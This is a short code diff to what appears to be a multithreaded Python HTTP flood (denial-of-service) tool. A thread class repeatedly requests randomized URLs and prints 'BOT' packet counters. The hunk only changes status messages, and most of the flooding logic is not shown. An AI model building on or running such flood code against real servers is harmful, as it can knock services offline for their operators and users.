@@ -76,9 +76,9 @@ class httpth1(threading.Thread):
                 requests.get(randomized_url, headers=headers)
                 u += 1
                 print("\033[48;5;1m\033[37m" +str(u)+ " \033[0m\033[36mrequests:") 
-                print("\033[33m " +(randomized_url)+ " \033[32mWorking\033[0m")     
+                print("\033[33m " +(url)+ " \033[32mrunning\033[0m")     
             except requests.exceptions.ConnectionError:
-                print("[*]  \033[1mBOT --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
+                print("Server maybe down")
                 pass
             except requests.exceptions.InvalidSchema:
                 print ("[REQUEST TIME OUT]")
